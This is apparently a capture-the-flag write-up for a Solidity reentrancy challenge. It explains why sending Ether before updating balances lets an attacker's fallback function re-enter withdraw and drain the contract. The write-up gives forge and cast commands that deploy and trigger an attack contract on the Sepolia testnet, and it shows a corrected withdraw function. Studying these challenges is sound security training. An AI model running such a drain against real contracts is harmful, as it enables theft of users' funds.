# Re-entrancy

Steal all the funds from the contract.

## Vulnerability

In Solidity, a `fallback` function is a function that is executed when a contract receives Ether along with data that does not match any of the other functions in the contract. If no such function exists, but the contract does receive Ether, then the fallback function is executed. It's also executed if someone just sent Ether to the contract without providing any data.

The contract is vulnerable to a reentrancy attack due to the way the withdraw function is implemented. In the `withdraw` function, you send Ether to `msg.sender` and then subtract the withdrawn amount from `balances[msg.sender]`. This allows for a reentrancy attack, where the fallback function of the attacker's contract calls `withdraw` again before the first call to `withdraw` has finished. This can drain the contract's Ether.

## Attack

1. Deploy `KingAttack.sol`

```bash
forge script script/DeployReentrancyAttack.s.sol --rpc-url $ALCHEMY_RPC_URL --private-key $PRIVATE_KEY --broadcast --verify --etherscan-api-key $ETHERSCAN_API_KEY -vvvv --legacy

# make deploy ARGS="--network sepolia"
# https://sepolia.etherscan.io/address/0xE6C6Bb5660a038B4Fd1a50828CEEecA9d08D1739
```
2. Attack

```bash
cast call $CONTRACT_ADDRESS "owner()" --rpc-url $ALCHEMY_RPC_URL --legacy
cast send $CONTRACT_ADDRESS "attack()" --value 0.001ether --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL --legacy
cast send $CONTRACT_ADDRESS "collect()" --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL --legacy
```

### Fix

The balance must be subtracted before the Ether is sent. This prevents a reentrant call from withdraw being able to withdraw more Ether than the caller is entitled to.

```bash
function withdraw(uint256 _amount) public {
    require(balances[msg.sender] >= _amount, "Insufficient balance");

    balances[msg.sender] = balances[msg.sender].sub(_amount);

    (bool result,) = msg.sender.call{value: _amount}("");
    require(result, "Transfer failed");
}
```
